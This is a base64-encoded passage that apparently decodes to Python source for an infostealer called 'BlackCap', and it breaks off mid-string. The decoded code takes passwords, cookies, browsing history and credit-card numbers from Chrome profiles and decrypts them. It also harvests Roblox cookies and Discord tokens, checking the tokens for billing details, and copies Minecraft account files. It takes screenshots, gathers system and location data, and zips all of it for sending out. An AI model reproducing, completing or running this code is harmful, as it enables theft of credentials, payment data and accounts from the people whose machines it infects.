BpZiByZS5tYXRjaChzZWxmLmNocm1yZ3gsIHByb2YpOgogICAgICAgICAgICAgICAgbG9naW5fZGIgPSBudHBhdGguam9pbihzZWxmLmNocm1tdXNlcmR0dCwgcHJvZiwgIkxvZ2luIERhdGEiKQogICAgICAgICAgICAgICAgbG9naW4gPSBzZWxmLmZpbGVzX2NyZWF0aW5nKCkKCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weTIobG9naW5fZGIsIGxvZ2luKQogICAgICAgICAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChsb2dpbikKICAgICAgICAgICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICAgICAgICAgIGN1cnNvci5leGVjdXRlKAogICAgICAgICAgICAgICAgICAgICJTRUxFQ1QgYWN0aW9uX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIgogICAgICAgICAgICAgICAgKQoKICAgICAgICAgICAgICAgIGZvciByIGluIGN1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgICAgIHVybCA9IHJbMF0KICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHJbMV0KICAgICAgICAgICAgICAgICAgICBlbmNyeXB0ZWRfcGFzc3dvcmQgPSByWzJdCiAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3N3b3JkID0gc2VsZi52YWx1ZV9kZWNyeXB0KAogICAgICAgICAgICAgICAgICAgICAgICBlbmNyeXB0ZWRfcGFzc3dvcmQsIHNlbGYuY2hyb21lX2tleQogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICBpZiB1cmwgIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIlVSTDoge3VybH1cbklEOiB7dXNlcm5hbWV9XG5QQVNTVzBSRDoge2RlY3J5cHRlZF9wYXNzd29yZH1cblxuIgogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUobG9naW4pCiAgICAgICAgZi5jbG9zZSgpCgogICAgQGV4dHJhY3RfdHJ5CiAgICBkZWYgc3RlYWxfY29va2llcyhzZWxmKToKICAgICAgICBmID0gb3BlbigKICAgICAgICAgICAgbnRwYXRoLmpvaW4oc2VsZi5kaXIsICJHb29nbGUiLCAiQ29va2llcy50eHQiKSwKICAgICAgICAgICAgInciLAogICAgICAgICAgICBlbmNvZGluZz0iY3A0MzciLAogICAgICAgICAgICBlcnJvcnM9Imlnbm9yZSIsCiAgICAgICAgKQogICAgICAgIGZvciBwcm9mIGluIG9zLmxpc3RkaXIoc2VsZi5jaHJtbXVzZXJkdHQpOgogICAgICAgICAgICBpZiByZS5tYXRjaChzZWxmLmNocm1yZ3gsIHByb2YpOgogICAgICAgICAgICAgICAgbG9naW5fZGIgPSBudHBhdGguam9pbihzZWxmLmNocm1tdXNlcmR0dCwgcHJvZiwgIk5ldHdvcmsiLCAiY29va2llcyIpCiAgICAgICAgICAgICAgICBsb2dpbiA9IHNlbGYuZmlsZXNfY3JlYXRpbmcoKQoKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5Mihsb2dpbl9kYiwgbG9naW4pCiAgICAgICAgICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KGxvZ2luKQogICAgICAgICAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgICAgICAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBob3N0X2tleSwgbmFtZSwgZW5jcnlwdGVkX3ZhbHVlIGZyb20gY29va2llcyIpCgogICAgICAgICAgICAgICAgZm9yIHIgaW4gY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICAgICAgaG9zdCA9IHJbMF0KICAgICAgICAgICAgICAgICAgICB1c2VyID0gclsxXQogICAgICAgICAgICAgICAgICAgIGRlY3J5cHRlZF9jb29raWUgPSBzZWxmLnZhbHVlX2RlY3J5cHQoclsyXSwgc2VsZi5jaHJvbWVfa2V5KQogICAgICAgICAgICAgICAgICAgIGlmIGhvc3QgIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIntob3N0fQlUUlVFIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgKyAiCQkiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICArIGYiL0ZBTFNFCTI1OTc1NzM0NTYJe3VzZXJ9CXtkZWNyeXB0ZWRfY29va2llfVxuIgogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgaWYgKAogICAgICAgICAgICAgICAgICAgICAgICAiX3xXQVJOSU5HOi1ETy1OT1QtU0hBUkUtVEhJUy4tLVNoYXJpbmctdGhpcy13aWxsLWFsbG93LXNvbWVvbmUtdG8tbG9nLWluLWFzLXlvdS1hbmQtdG8tc3RlYWwteW91ci1ST0JVWC1hbmQtaXRlbXMufF8iCiAgICAgICAgICAgICAgICAgICAgICAgIGluIGRlY3J5cHRlZF9jb29raWUKICAgICAgICAgICAgICAgICAgICApOgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnJvYmxveGNvb2tpZXMuYXBwZW5kKGRlY3J5cHRlZF9jb29raWUpCiAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUobG9naW4pCiAgICAgICAgZi5jbG9zZSgpCgogICAgZGVmIHN0ZWFsX2hpc3RvcnkyKHNlbGYsIG5hbWU6IHN0ciwgcGF0aDogc3RyLCBwcm9maWxlOiBzdHIpOgogICAgICAgIHBhdGggKz0gIlxcIiArIHByb2ZpbGUgKyAiXFxIaXN0b3J5IgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoKToKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgaGlzdG9yeXZhdWx0ID0gc2VsZi5yYW5kb21fZGlyX2NyZWF0ZSgpCiAgICAgICAgY29weTIocGF0aCwgaGlzdG9yeXZhdWx0KQogICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoaGlzdG9yeXZhdWx0KQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICB3aXRoIG9wZW4oCiAgICAgICAgICAgIG9zLnBhdGguam9pbihzZWxmLmRpciwgIkJyb3dzZXJzIiwgIkJyb3dzZXJzIEhpc3RvcnkudHh0IiksCiAgICAgICAgICAgICJhIiwKICAgICAgICAgICAgZW5jb2Rpbmc9InV0Zi04IiwKICAgICAgICApIGFzIGY6CiAgICAgICAgICAgIHNpdGVzID0gW10KICAgICAgICAgICAgZm9yIHJlcyBpbiBjdXJzb3IuZXhlY3V0ZSgKICAgICAgICAgICAgICAgICJTRUxFQ1QgdXJsLCB0aXRsZSwgdmlzaXRfY291bnQsIGxhc3RfdmlzaXRfdGltZSBGUk9NIHVybHMiCiAgICAgICAgICAgICkuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgIHVybCwgdGl0bGUsIHZpc2l0X2NvdW50LCBsYXN0X3Zpc2l0X3RpbWUgPSByZXMKICAgICAgICAgICAgICAgIGlmIHVybCBhbmQgdGl0bGUgYW5kIHZpc2l0X2NvdW50IGFuZCBsYXN0X3Zpc2l0X3RpbWUgIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgc2l0ZXMuYXBwZW5kKCh1cmwsIHRpdGxlLCB2aXNpdF9jb3VudCwgbGFzdF92aXNpdF90aW1lKSkKICAgICAgICAgICAgc2l0ZXMuc29ydChrZXk9bGFtYmRhIHg6IHhbM10sIHJldmVyc2U9VHJ1ZSkKICAgICAgICAgICAgZm9yIHNpdGUgaW4gc2l0ZXM6CiAgICAgICAgICAgICAgICBmLndyaXRlKCJWaXNpdCBDb3VudDogezo8Nn0gVGl0bGU6IHs6PDQwfVxuIi5mb3JtYXQoc2l0ZVsyXSwgc2l0ZVsxXSkpCiAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICBjb25uLmNsb3NlKCkKICAgICAgICBvcy5yZW1vdmUoaGlzdG9yeXZhdWx0KQoKICAgIGRlZiBzdGVhbF9jYzIoc2VsZiwgbmFtZTogc3RyLCBwYXRoOiBzdHIsIHByb2ZpbGU6IHN0cik6CiAgICAgICAgcGF0aCArPSAiXFwiICsgcHJvZmlsZSArICJcXFdlYiBEYXRhIgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoKToKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgY2NfdmF1bHRzID0gc2VsZi5yYW5kb21fZGlyX2NyZWF0ZSgpCiAgICAgICAgY29weTIocGF0aCwgY2NfdmF1bHRzKQogICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoY2NfdmF1bHRzKQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICB3aXRoIG9wZW4oCiAgICAgICAgICAgIG9zLnBhdGguam9pbihzZWxmLmRpciwgIkJyb3dzZXJzIiwgIkJyb3dzZXJzIENDLnR4dCIpLCAiYSIsIGVuY29kaW5nPSJ1dGYtOCIKICAgICAgICApIGFzIGY6CiAgICAgICAgICAgIGZvciByZXMgaW4gY3Vyc29yLmV4ZWN1dGUoCiAgICAgICAgICAgICAgICAiU0VMRUNUIG5hbWVfb25fY2FyZCwgZXhwaXJhdGlvbl9tb250aCwgZXhwaXJhdGlvbl95ZWFyLCBjYXJkX251bWJlcl9lbmNyeXB0ZWQgRlJPTSBjcmVkaXRfY2FyZHMiCiAgICAgICAgICAgICkuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgIG5hbWVfb25fY2MsIGV4cGlyX29uX2NjLCBleHBpcl95ZWFyX2NjLCBudW1iZXJfb25teV9jYyA9IHJlcwogICAgICAgICAgICAgICAgaWYgbmFtZV9vbl9jYyBhbmQgbnVtYmVyX29ubXlfY2MgIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgZiJOYW1lOiB7bmFtZV9vbl9jY30gICBFeHBpcmF0aW9uIE1vbnRoOiB7ZXhwaXJfb25fY2N9ICAgRXhwaXJhdGlvbiBZZWFyOiB7ZXhwaXJfeWVhcl9jY30gICBDYXJkIE51bWJlcjoge3NlbGYudmFsdWVfZGVjcnlwdChudW1iZXJfb25teV9jYywgc2VsZi5tYXN0ZXJrZXkpfVxuIgogICAgICAgICAgICAgICAgICAgICkKICAgICAgICBmLmNsb3NlKCkKICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIG9zLnJlbW92ZShjY192YXVsdHMpCgogICAgQGV4dHJhY3RfdHJ5CiAgICBkZWYgc3RlYWxfaGlzdG9yeShzZWxmKToKICAgICAgICBmID0gb3BlbigKICAgICAgICAgICAgbnRwYXRoLmpvaW4oc2VsZi5kaXIsICJHb29nbGUiLCAiSGlzdG9yeS50eHQiKSwKICAgICAgICAgICAgInciLAogICAgICAgICAgICBlbmNvZGluZz0iY3A0MzciLAogICAgICAgICAgICBlcnJvcnM9Imlnbm9yZSIsCiAgICAgICAgKQoKICAgICAgICBkZWYgZXhjdHJhY3RfdGhpc19iYyhkYl9jdXJzb3IpOgogICAgICAgICAgICBfbmV0ID0gIiIKICAgICAgICAgICAgZGJfY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCB0aXRsZSwgdXJsLCBsYXN0X3Zpc2l0X3RpbWUgRlJPTSB1cmxzIikKICAgICAgICAgICAgZm9yIGl0ZW0gaW4gZGJfY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICBfbmV0ICs9IGYiU2VhcmNoIFRpdGxlOiB7aXRlbVswXX1cblVSTDoge2l0ZW1bMV19XG5MQVNUIFZJU0lUIFRJTUU6IHtzZWxmLnRpbWVfY29udmVydGlvbihpdGVtWzJdKS5zdHJmdGltZSgnJVkvJW0vJWQgLSAlSDolTTolUycpfVxuXG4iCiAgICAgICAgICAgIHJldHVybiBfbmV0CgogICAgICAgIGRlZiBleGN0cmFjdF93ZWJzZWFyY2hfYmMoZGJfY3Vyc29yKToKICAgICAgICAgICAgZGJfY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCB0ZXJtIEZST00ga2V5d29yZF9zZWFyY2hfdGVybXMiKQogICAgICAgICAgICBzZWFyY2hfdGVybXMgPSAiIgoKICAgICAgICAgICAgZm9yIGl0ZW0gaW4gZGJfY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICBpZiBpdGVtWzBdICE9ICIiOgogICAgICAgICAgICAgICAgICAgIHNlYXJjaF90ZXJtcyArPSBmIntpdGVtWzBdfVxuIgogICAgICAgICAgICByZXR1cm4gc2VhcmNoX3Rlcm1zCgogICAgICAgIGZvciBwcm9mIGluIG9zLmxpc3RkaXIoc2VsZi5jaHJtbXVzZXJkdHQpOgogICAgICAgICAgICBpZiByZS5tYXRjaChzZWxmLmNocm1yZ3gsIHByb2YpOgogICAgICAgICAgICAgICAgbG9naW5fZGIgPSBudHBhdGguam9pbihzZWxmLmNocm1tdXNlcmR0dCwgcHJvZiwgIkhpc3RvcnkiKQogICAgICAgICAgICAgICAgbG9naW4gPSBzZWxmLmZpbGVzX2NyZWF0aW5nKCkKCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weTIobG9naW5fZGIsIGxvZ2luKQogICAgICAgICAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChsb2dpbikKICAgICAgICAgICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKCiAgICAgICAgICAgICAgICBzZWFyY2hfaGlzdG9yeSA9IGV4Y3RyYWN0X3dlYnNlYXJjaF9iYyhjdXJzb3IpCiAgICAgICAgICAgICAgICB3ZWJfaGlzdG9yeSA9IGV4Y3RyYWN0X3RoaXNfYmMoY3Vyc29yKQoKICAgICAgICAgICAgICAgIGYud3JpdGUoCiAgICAgICAgICAgICAgICAgICAgZiJ7JyAnKjE3fVNFQVJDSFxueyctJyo1MH1cbntzZWFyY2hfaGlzdG9yeX1cbnsnICcqMTd9XG5cbkxpbmtzIEhpc3RvcnlcbnsnLScqNTB9XG57d2ViX2hpc3Rvcnl9IgogICAgICAgICAgICAgICAgKQoKICAgICAgICAgICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgICAgICAgICBjb25uLmNsb3NlKCkKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShsb2dpbikKICAgICAgICBmLmNsb3NlKCkKCiAgICBkZWYgbmF0aWZ5X21hdGNoZWRfdG9rZW5zKHNlbGYpOgogICAgICAgIGYgPSBvcGVuKAogICAgICAgICAgICBzZWxmLmRpciArICJcXERpc2NvcmRfSW5mby50eHQiLCAidyIsIGVuY29kaW5nPSJjcDQzNyIsIGVycm9ycz0iaWdub3JlIgogICAgICAgICkKCiAgICAgICAgZm9yIHRva2VuIGluIHNlbGYudG9rZW5zOgogICAgICAgICAgICBqID0gaHR0cHguZ2V0KHNlbGYuZHNjYXAxLCBoZWFkZXJzPXNlbGYuaGVhZGVyX21ha2luZyh0b2tlbikpLmpzb24oKQogICAgICAgICAgICB1c2VyID0gai5nZXQoInVzZXJuYW1lIikgKyAiIyIgKyBzdHIoai5nZXQoImRpc2NyaW1pbmF0b3IiKSkKCiAgICAgICAgICAgIGRpc2NfYmFkZyA9ICIiCiAgICAgICAgICAgIGZsYWdzID0galsiZmxhZ3MiXQogICAgICAgICAgICBpZiBmbGFncyA9PSAxOgogICAgICAgICAgICAgICAgZGlzY19iYWRnICs9ICJTdGFmZiwgIgogICAgICAgICAgICBpZiBmbGFncyA9PSAyOgogICAgICAgICAgICAgICAgZGlzY19iYWRnICs9ICJQYXJ0bmVyLCAiCiAgICAgICAgICAgIGlmIGZsYWdzID09IDQ6CiAgICAgICAgICAgICAgICBkaXNjX2JhZGcgKz0gIkh5cGVzcXVhZCBFdmVudCwgIgogICAgICAgICAgICBpZiBmbGFncyA9PSA4OgogICAgICAgICAgICAgICAgZGlzY19iYWRnICs9ICJHcmVlbiBCdWdodW50ZXIsICIKICAgICAgICAgICAgaWYgZmxhZ3MgPT0gNjQ6CiAgICAgICAgICAgICAgICBkaXNjX2JhZGcgKz0gIkh5cGVzcXVhZCBCcmF2ZXJ5LCAiCiAgICAgICAgICAgIGlmIGZsYWdzID09IDEyODoKICAgICAgICAgICAgICAgIGRpc2NfYmFkZyArPSAiSHlwZVNxdWFkIEJyaWxsYW5jZSwgIgogICAgICAgICAgICBpZiBmbGFncyA9PSAyNTY6CiAgICAgICAgICAgICAgICBkaXNjX2JhZGcgKz0gIkh5cGVTcXVhZCBCYWxhbmNlLCAiCiAgICAgICAgICAgIGlmIGZsYWdzID09IDUxMjoKICAgICAgICAgICAgICAgIGRpc2NfYmFkZyArPSAiRWFybHkgU3VwcG9ydGVyLCAiCiAgICAgICAgICAgIGlmIGZsYWdzID09IDE2Mzg0OgogICAgICAgICAgICAgICAgZGlzY19iYWRnICs9ICJHb2xkIEJ1Z0h1bnRlciwgIgogICAgICAgICAgICBpZiBmbGFncyA9PSAxMzEwNzI6CiAgICAgICAgICAgICAgICBkaXNjX2JhZGcgKz0gIlZlcmlmaWVkIEJvdCBEZXZlbG9wZXIsICIKICAgICAgICAgICAgaWYgZmxhZ3MgPT0gNDE5NDMwNDoKICAgICAgICAgICAgICAgIGRpc2NfYmFkZyArPSAiQWN0aXZlIERldmVsb3BlciwgIgogICAgICAgICAgICBpZiBkaXNjX2JhZGcgPT0gIiI6CiAgICAgICAgICAgICAgICBkaXNjX2JhZGcgPSAiTm9uZSIKICAgICAgICAgICAgZW1haWwgPSBqLmdldCgiZW1haWwiKQogICAgICAgICAgICBwaG9uZSA9IGouZ2V0KCJwaG9uZSIpIGlmIGouZ2V0KCJwaG9uZSIpIGVsc2UgIk5vIFBob25lIE51bWJlciBhdHRhY2hlZCIKICAgICAgICAgICAgbml0cm9fZGF0YSA9IGh0dHB4LmdldCgKICAgICAgICAgICAgICAgIHNlbGYuZHNjYXAxICsgIi9iaWxsaW5nL3N1YnNjcmlwdGlvbnMiLAogICAgICAgICAgICAgICAgaGVhZGVycz1zZWxmLmhlYWRlcl9tYWtpbmcodG9rZW4pLAogICAgICAgICAgICApLmpzb24oKQogICAgICAgICAgICBoYXNfbml0cm8gPSBGYWxzZQogICAgICAgICAgICBoYXNfbml0cm8gPSBib29sKGxlbihuaXRyb19kYXRhKSA+IDApCiAgICAgICAgICAgIGJpbGxpbmcgPSBib29sKAogICAgICAgICAgICAgICAgbGVuKAogICAgICAgICAgICAgICAgICAgIGpzb24ubG9hZHMoCiAgICAgICAgICAgICAgICAgICAgICAgIGh0dHB4LmdldCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZHNjYXAxICsgIi9iaWxsaW5nL3BheW1lbnQtc291cmNlcyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXJzPXNlbGYuaGVhZGVyX21ha2luZyh0b2tlbiksCiAgICAgICAgICAgICAgICAgICAgICAgICkudGV4dAogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgID4gMAogICAgICAgICAgICApCgogICAgICAgICAgICBmLndyaXRlKAogICAgICAgICAgICAgICAgZiJ7JyAnKjE3fXt1c2VyfVxueyctJyo1MH1cbkJpbGxpbmc/OiB7YmlsbGluZ31cbk5pdHJvOiB7aGFzX25pdHJvfVxuZGlzY19iYWRnOiB7ZGlzY19iYWRnfVxuUGhvbmU6IHtwaG9uZX1cblRva2VuOiB7dG9rZW59XG5FbWFpbDoge2VtYWlsfVxuXG4iCiAgICAgICAgICAgICkKICAgICAgICBmLmNsb3NlKCkKCiAgICBkZWYgbWNfZmluZChzZWxmKToKICAgICAgICBwYXRoX2Zvcl9tY2FwcCA9IG50cGF0aC5qb2luKHNlbGYuZGlyLCAiTWluZWNyYWZ0IikKICAgICAgICBvcy5tYWtlZGlycyhwYXRoX2Zvcl9tY2FwcCwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICBtYyA9IG50cGF0aC5qb2luKHNlbGYucm9hbWluZywgIi5taW5lY3JhZnQiKQoKICAgICAgICBmaWxlc190b2dldCA9IFsKICAgICAgICAgICAgImxhdW5jaGVyX2FjY291bnRzLmpzb24iLAogICAgICAgICAgICAibGF1bmNoZXJfcHJvZmlsZXMuanNvbiIsCiAgICAgICAgICAgICJ1c2VyY2FjaGUuanNvbiIsCiAgICAgICAgICAgICJsYXVuY2hlcl9sb2cudHh0IiwKICAgICAgICBdCgogICAgICAgIGZvciBfZmlsZSBpbiBmaWxlc190b2dldDoKICAgICAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhudHBhdGguam9pbihtYywgX2ZpbGUpKToKICAgICAgICAgICAgICAgICMgVE8gRE86IGZpeGUgYWxsIG1jIGFwcAogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKG50cGF0aC5qb2luKG1jLCBfZmlsZSksIHBhdGhfZm9yX21jYXBwICsgc2VsZi5zZXAgKyBfZmlsZSkKCiAgICBkZWYgZmluZF9yb2Jsb3goc2VsZik6CiAgICAgICAgZGVmIHN1YnByb2MocGF0aCk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJldHVybiAoCiAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoCiAgICAgICAgICAgICAgICAgICAgICAgIHJmInBvd2Vyc2hlbGwgR2V0LUl0ZW1Qcm9wZXJ0eVZhbHVlIC1QYXRoIHtwYXRofTpTT0ZUV0FSRVxSb2Jsb3hcUm9ibG94U3R1ZGlvQnJvd3Nlclxyb2Jsb3guY29tIC1OYW1lIC5ST0JMT1NFQ1VSSVRZIiwKICAgICAgICAgICAgICAgICAgICAgICAgY3JlYXRpb25mbGFncz0weDA4MDAwMDAwLAogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAuZGVjb2RlKCkKICAgICAgICAgICAgICAgICAgICAucnN0cmlwKCkKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHJldHVybiBOb25lCgogICAgICAgIHJlZ19jb29raWUgPSBzdWJwcm9jKHIiSEtMTSIpCiAgICAgICAgaWYgbm90IHJlZ19jb29raWU6CiAgICAgICAgICAgIHJlZ19jb29raWUgPSBzdWJwcm9jKHIiSEtDVSIpCiAgICAgICAgaWYgcmVnX2Nvb2tpZToKICAgICAgICAgICAgc2VsZi5yb2Jsb3hjb29raWVzLmFwcGVuZChyZWdfY29va2llKQogICAgICAgIGlmIHNlbGYucm9ibG94Y29va2llczoKICAgICAgICAgICAgd2l0aCBvcGVuKHNlbGYuZGlyICsgIlxcUm9ibG94X0Nvb2tpZXMudHh0IiwgInciKSBhcyBmOgogICAgICAgICAgICAgICAgZm9yIGkgaW4gc2VsZi5yb2Jsb3hjb29raWVzOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoaSArICJcbiIpCgogICAgZGVmIHNjcmVlbnRpbWVzKHNlbGYpOgogICAgICAgIGltYWdlID0gSW1hZ2VHcmFiLmdyYWIoCiAgICAgICAgICAgIGJib3g9Tm9uZSwgaW5jbHVkZV9sYXllcmVkX3dpbmRvd3M9RmFsc2UsIGFsbF9zY3JlZW5zPVRydWUsIHhkaXNwbGF5PU5vbmUKICAgICAgICApCiAgICAgICAgaW1hZ2Uuc2F2ZShzZWxmLmRpciArICJcXFNjcmVlbnNob3QucG5nIikKICAgICAgICBpbWFnZS5jbG9zZSgpCgogICAgZGVmIHN5c3RlbV9pbmZvcm1hdGlvbnMoc2VsZik6CiAgICAgICAgYWJvdXQgPSBmIiIiCntsb2dpbl9pbmZvfSB8IHtjb21wdXRlcl92aWN0aW19CldpbmRvd3Mga2V5OiB7c2VsZi5rZXlfd2luZG93c19maW5kfQpXaW5kb3dzIHZlcnNpb246IHtzZWxmLm5ldmVyX3dpbmR9ClJBTToge2Zhc3RfbWVtb3J5X3N0b3JhZ2V9R0IKRElTSzoge3N0b3JhZ2Vfc3BhY2V9R0IKSFdJRDoge3NlbGYud2luZG93c191dWlkfQpJUDoge3NlbGYuaXB9CkNpdHk6IHtzZWxmLmNpdHl9CkNvdW50cnk6IHtzZWxmLmNvdW50cnl9ClJlZ2lvbjoge3NlbGYucmVnaW9ufQpPcmc6IHtzZWxmLm9yZ30KR29vZ2xlTWFwczoge3NlbGYuZ29vZ2xlbWFwfQogICAgICAgICIiIgogICAgICAgIHdpdGggb3BlbigKICAgICAgICAgICAgc2VsZi5kaXIgKyAiXFxTeXN0ZW1fSW5mby50eHQiLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIsIGVycm9ycz0iaWdub3JlIgogICAgICAgICkgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShhYm91dCkKCiAgICBkZWYgZmluaXNoZWRfYmMoc2VsZik6CiAgICAgICAgZm9yIGkgaW4gb3MubGlzdGRpcihzZWxmLmRpcik6CiAgICAgICAgICAgIGlmIGkuZW5kc3dpdGgoIi50eHQiKToKICAgICAgICAgICAgICAgIHBhdGggPSBzZWxmLmRpciArIHNlbGYuc2VwICsgaQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJyIiwgZXJyb3JzPSJpZ25vcmUiKSBhcyBmZjoKICAgICAgICAgICAgICAgICAgICB4ID0gZmYucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHg6CiAgICAgICAgICAgICAgICAgICAgICAgIGZmLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IiwgZXJyb3JzPSJpZ25vcmUiKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQmxhY2sgQ2FwIENyZWF0ZSBCeSBLUy5IIHwgaHR0cHM6Ly9naXRodWIuY29tL0tTQ0hkc2NcblxuIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ocGF0aCwgImEiLCBlbmNvZGluZz0idXRmLTgiLCBlcnJvcnM9Imlnbm9yZSIpIGFzIGZwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZnAud3JpdGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICsgIlxuXG5CbGFjayBDYXAgQ3JlYXRlIEJ5IEtTQ0ggfCBodHRwczovL2dpdGh1Yi5jb20vS1NDSGRzYyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICBfemlwZmlsZSA9IG50cGF0aC5qb2luKHNlbGYuYXBwZGF0YSwgZiJCQy1be2xvZ2luX2luZm99XS56aXAiKQogICAgICAgIHppcHBlZF9maWxlID0gemlwZmlsZS5aaXBGaWxlKF96aXBmaWxlLCAidyIsIHppcGZpbGUuWklQX0RFRkxBVEVEKQogICAgICAgIHBhdGhfc3JjID0gbnRwYXRoLmFic3BhdGgoc2VsZi5kaXIpCiAgICAgICAgZm9yIGRpcm5hbWUsIF8sIGZpbGVzIGluIG9zLndhbGsoc2VsZi5kaXIpOgogICAgICAgICAgICBmb3IgZmlsZW5hbWUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICBhYnNuYW1lID0gbnRwYXRoLmFic3BhdGgobnRwYXRoLmpvaW4oZGlybmFtZSwgZmlsZW5hbWUpKQogICAgICAgICAgICAgICAgYXJjbmFtZSA9IGFic25hbWVbbGVuKHBhdGhfc3JjKSArIDEgOl0KICAgICAgICAgICAgICAgIHppcHBlZF9maWxlLndyaXRlKGFic25hbWUsIGFyY25hbWUpCiAgICAgICAgemlwcGVkX2ZpbGUuY2xvc2UoKQoKICAgICAgICBmaWxlX2NvdW50LCBmaWxlc19mb3VuZCwgdG9rZW5zID0gMCwgIiIsICIiCiAgICAgICAgZm9yIF8sIF9fLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYuZGlyKToKICAgICAgICAgICAgZm9yIF9maWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgZmlsZXNfZm91bmQgKz0gZiLigK/inq/igK97X2ZpbGV9XG4iCiAgICAgICAgICAgICAgICBmaWxlX2NvdW50ICs9IDEKICAgICAgICBmb3IgdGtuIGluIHNlbGYudG9rZW5zOgogICAgICAgICAgICB0b2tlbnMgKz0gZiJ7dGtufVxuXG4iCiAgICAgICAgZmlsZUNvdW50ID0gZiJ7ZmlsZV9jb3VudH0gRmlsZXMgRm91bmQ6ICIKCiAgICAgICAgZW1iZWQgPSB7CiAgICAgICAgICAgICJuYW1lIjogIkJsYWNrQ2FwIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tTQ0hkc2MvQmxhY2tDYXAtQXNzZXRzL21haW4vYmxhY2tjYXAlMjA